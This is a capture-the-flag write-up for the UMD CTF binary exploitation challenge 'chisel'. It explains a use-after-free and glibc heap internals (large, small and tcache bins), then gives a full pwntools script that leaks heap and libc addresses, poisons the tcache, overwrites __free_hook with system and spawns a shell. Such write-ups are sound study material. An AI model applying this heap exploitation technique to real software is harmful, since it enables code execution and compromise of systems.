# UMD  CTF

{% hint style="info" %}
I'm quite busy during the competition and so does my teammates, so we didn't put too much time into this, but I did take a glance on some of the challenges and they pique my interest so I tried to solve them myself after the ctf had over to learn one or more things :D
{% endhint %}

<table><thead><tr><th width="248">Challenge</th><th width="244">Category</th><th width="152" align="center">Points</th><th align="center">Solves</th></tr></thead><tbody><tr><td>chisel</td><td>Binary Exploitation</td><td align="center">495 pts</td><td align="center">7</td></tr></tbody></table>

## chisel

### Description

> Help! Baron Harkonnen is forcing me to make a statue in the light of the scorching black sun.
>
> Lend me a helping hand, will you?
>
> `nc challs.umdctf.io 31447`

### Binary Analysis

we're given attachments as follows:

```bash
└──╼ [★]$ tree .
.
├── chisel
├── ld-linux-x86-64.so.2
└── libc.so.6

└──╼ [★]$ pwn checksec chisel
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  b'.'
```

running the binary, we're greeted with the following options:

```bash
└──╼ [★]$ ./chisel
1) Alloc
2) Free
3) Edit
4) Print
5) Chisel
6) Exit
> 
```

decompiling the binary in ghidra, it is quite small and only have a `main()` function

```c
undefined8 main(void)
{
  undefined4 c;
  size_t size;
  undefined8 data;
  undefined8 *chunk;
  
  chunk = (undefined8 *)0x0;
  setbuf(stdin,(char *)0x0);
  setbuf(stdout,(char *)0x0);
  do {
    c = prompt();
    switch(c) {
    default:
      puts("cya!");
      return 0;
    case 1:
      printf("size: ");
      size = read_long();
      chunk = (undefined8 *)malloc(size);
      break;
    case 2:
      free(chunk);
      break;
    case 3:
      printf("data: ");
      data = read_long();
      *chunk = data;
      break;
    case 4:
      printf("data: %ld\n",*chunk);
      break;
    case 5:
      malloc(0x4f8);
    }
  } while( true );
}
```

note:

* we can only keep track of chunk at a time of any sizes
* data given to the chunk is limited to 8 bytes.
* there's an UAF, since the pointer is not deleted upon free
* we can trigger `malloc(0x4f8)` without interacting with the chunk, this means we are unable to free or edit the chunk returned by said chunk

### Exploitation

to exploit this, I'm going to delve into an area I'm not familiar with and that is chunk consolidation, chunk splitting, small bins and large bins.&#x20;

in this challenge, utilizing internal implementation of malloc, we'll see how we can maneuver a free chunk from the large bin, into the tcache.

#### Leaking Heap Base

first with the UAF, let's grab a quick heap address leak.

```python
alloc(0x10)
free()
heap = read() << 12
alloc(0x10)
```

#### Linking Large Bins

for the next subsequent request we wanted to fill in the large bins, note that since we're adjacent to the top chunk, every malloc immediate to free will consolidate the chunk to the wilderness instead of linking it to the bins.

and since, we can only keep track of one chunk at a time, in the middle of malloc and free, we would want to call `chisel()` to create a buffer between the allocated chunk and the wilderness to prevent it from consolidating.

```python
BASE_SIZE = 0x418
for i in range(1, 4):
    alloc(BASE_SIZE + (i * 0x20))
    chisel()
    free()
```

now you might ask, what's with the request size and why we need to do such, as of now, take this for granted cause it will be clearer and much easier to explain and understand in later part of the exploitation.

to understand this better, lets start slowly with this:

```python
alloc(BASE_SIZE + (1 * 0x20))
chisel()
free()
```

now, lets take a look at the heap state in GDB:

<figure><img src="../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

as you can see, as the request size doesn't match either of the fastbin nor tcache, it will go to the unsorted bin.

now if we continue the program with this:

```python
alloc(BASE_SIZE + (2 * 0x20))
chisel()
free()
```

and examining the heap state in GDB:

<figure><img src="../../.gitbook/assets/image (36).png" alt=""><figcaption></figcaption></figure>

we can see the previous chunk is now linked to the large bin and the recent one is in the unsorted bin.

recall from the heap implementation:

{% embed url="https://azeria-labs.com/heap-exploitation-part-2-glibc-heap-free-bins/" %}

> The heap manager improves this basic algorithm one step further using an optimizing cache layer called the “unsorted bin”. This optimization is based on the observation that often frees are clustered together, and frees are often immediately followed by allocations of similarly sized chunks.
>
> \
> During _malloc_, each item on the unsorted bin is checked to see if it “fits” the request. If it does, _malloc_ can use it immediately. If it does not, malloc then puts the chunk into its corresponding small or large bin.

and so since the 2nd request has a larger size than what the unsorted currently holds, it takes a new space from the top to return to the 2nd request and then throws the current unsorted chunk to its respective bins, in this case judging from its size, it gets linked into the large bin.

also recall that unlike the other bins, large bins doesn't contain a chunk with a fixed size, rather a range of size. in the screenshot above, you can see that our chunk gets linked into a large bin that can contain a chunk with a size starting from 0x440 up until 0x470.

that is the reason specifically why we request malloc with different sizes starting from the lowest to the highest but still will fall within the same large bin size range.

with this in mind, we are essentially linking 3 chunks into the large bin.

#### Libc Leak

with the chunks previously goes through the unsorted bin, we have a libc address within it, using UAF we can read the addresses and calculate the offset to gain the base address.

```python
libc.address = read() - 0x1e0c00
```

#### Linking Small Bins

for this part, now we will performing a chunk split. we will request another 3 with sizes the same as before but `-0x20` in order.

if previously we requested with sizes (in order):

* 0x438
* 0x458
* 0x478

now we requesting with sizes (in order):

* 0x418
* 0x438
* 0x458

as follows:

```python
for i in range(0, 3):
    alloc(BASE_SIZE + (i * 0x20))
```

when malloc is encountered with this request, all of the bins are empty but the large bins. and so it will traverse the large bin to find chunks that are less or equal to the requested size.&#x20;

and in this case when we're request a chunk of size 0x420 (0x418 of request size) it finds a suitable chunk in the large bin of size 0x440 (0x438 of request size)

but the suitable chunk is larger by 0x20 bytes, in this case heap will split the chunk into two of size 0x420 and 0x20 respectfully. and the remainder chunk of size 0x20 will be put into its respective bin, in this case the small bin.

{% hint style="info" %}
note that as always, it will be linked into the unsorted bin first before to the small bin for performance reasons as explained in the Azeria-Labs blog linked above.
{% endhint %}

we can examine this in verbosity if I change the loop as follow:

```python
alloc(BASE_SIZE + (0 * 0x20))
pause()

alloc(BASE_SIZE + (1 * 0x20))
pause()

alloc(BASE_SIZE + (2 * 0x20))
pause()
```

on the first pause:

<figure><img src="../../.gitbook/assets/Screenshot 2024-08-09 204145.png" alt=""><figcaption></figcaption></figure>

on the second pause:

<figure><img src="../../.gitbook/assets/Screenshot 2024-08-09 204204.png" alt=""><figcaption></figcaption></figure>

on the third pause:

<figure><img src="../../.gitbook/assets/Screenshot 2024-08-09 204218.png" alt=""><figcaption></figcaption></figure>

as you can observe in the screenshots above, the chunks are linked in to small bins.&#x20;

we can even further confirm this by refreshing the performance cache on unsorted bin by simply allocating another big chunk to see it is linked to the small bins:

<figure><img src="../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>

#### Linking Tcache

from the same Azeria-Labs blog mentioned above, quote:

> 1. Try the _fastbin/smallbin_ recycling strategy
>    * If a corresponding _fast bin_ exists, try and find a chunk from there (and also opportunistically prefill the _tcache_ with entries from the fast bin).
>    * Otherwise, if a corresponding _small bin_ exists, allocate from there (opportunistically prefilling the _tcache_ as we go).

which means, upon malloc (not sure whether this is being done before or after the memory is allocated), it will check if fastbin or small bin exist, if it exist but tcache is empty, it will move all of the chunks there to tcache until its respective size are full.

to see this in action we can simply do an allocation of size 0x10 (will be 0x20 because of metadata, which is also the size of the small bin):

<figure><img src="../../.gitbook/assets/Screenshot 2024-08-09 210203.png" alt=""><figcaption></figcaption></figure>

initially we had 3 chunks in the small bins, but since we already requested one, the remaining two goes into the tcache. this is also exactly why we requested 3 chunk at the start.

{% hint style="info" %}
note: if we requested of size that doesn't match of that particular small bin size, it will not do the linking as shown below
{% endhint %}

<figure><img src="../../.gitbook/assets/Screenshot 2024-08-09 210256.png" alt=""><figcaption></figcaption></figure>

#### hook -> system -> /bin/sh

with UAF and tcache in our control, the next step is quite self explanatory, do tcache poisoning into one of the hook with system and spawn a shell.

```python
free()

hook = mangle(heap, libc.sym['__free_hook'])
edit(hook)

alloc(0x10)
alloc(0x10)
edit(libc.sym['system'])

alloc(0x40)
edit(0x0068732f6e69622f)    # /bin/sh
free()                      # trigger system
```

<figure><img src="../../.gitbook/assets/image (38).png" alt="" width="409"><figcaption></figcaption></figure>

Below is the full exploit script:

{% code title="exploit.py" %}
```python
#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './chisel'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'info'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'challs.umdctf.io', 31447

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
# └──╼ [★]$ pwn checksec chisel
#     Arch:     amd64-64-little
#     RELRO:    Full RELRO
#     Stack:    Canary found
#     NX:       NX enabled
#     PIE:      PIE enabled
#     RUNPATH:  b'.'

def alloc(size):
    log.info('ALLOC[%#x]', size)
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'size:', str(size).encode())  

def free():
    io.sendlineafter(b'>', b'2')

def edit(data: int):
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b'data:', str(data).encode())

def read() -> int:
    io.sendlineafter(b'>', b'4')
    io.recvuntil(b'data: ')
    return int(io.recvline().strip())

def chisel():
    io.sendlineafter(b'>', b'5')

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val

def exploit():
    global io
    io = initialize()

    BASE_SIZE = 0x418

    alloc(0x10)
    free()
    heap = read() << 12
    alloc(0x10)

    for i in range(1, 4):
        alloc(BASE_SIZE + (i * 0x20))
        chisel()
        free()
    libc.address = read() - 0x1e0c00

    # smallbins
    # 0x20: 0x564324bd19b0 —▸ 0x564324bd1030 —▸ 0x564324bd06d0 —▸ 0x7fd450556c10 ◂— 0x564324bd19b0
    for i in range(0, 3):
        alloc(BASE_SIZE + (i * 0x20))

    # tcachebins
    # 0x20 [  2]: 0x564324bd19c0 —▸ 0x564324bd1040 ◂— 0x0
    alloc(0x10)
    free()

    hook = mangle(heap, libc.sym['__free_hook'])
    edit(hook)

    alloc(0x10)
    alloc(0x10)
    edit(libc.sym['system'])

    alloc(0x40)
    edit(0x0068732f6e69622f)    # /bin/sh
    free()                      # trigger system

    log.success('heap base: %#x', heap)
    log.success('libc base: %#x', libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
```
{% endcode %}

{% hint style="success" %}
Flag: _UMDCTF{a\_glorious\_statue\_for\_a\_glorious\_baron}_
{% endhint %}
